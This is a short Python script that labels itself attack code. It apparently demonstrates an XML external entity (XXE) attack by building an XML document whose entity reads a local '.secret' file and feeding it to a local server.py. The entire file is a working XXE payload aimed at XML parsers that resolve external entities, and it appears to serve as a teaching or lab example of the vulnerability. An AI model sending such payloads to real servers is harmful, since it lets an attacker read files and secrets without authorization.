#  This is the attack code
#  The attacker would send the server a vulnerable xml script
#  In this example, the xxe is designed to read a "secret" file
#  of which the attacker should not have access to

import subprocess

xml = '''\
<!DOCTYPE ent [
    <!ENTITY psswds SYSTEM "file://.secret"> 
]>
<data>
    <root>&psswds;</root>
    <item>
        <name>Item 1</name>
        <price>19.99</price>
    </item>
    <item>
        <name>Item 2</name>
        <price>29.99</price>
    </item>
</data>
'''

server_output = subprocess.check_output(["python", "server.py", xml])

print(server_output.decode())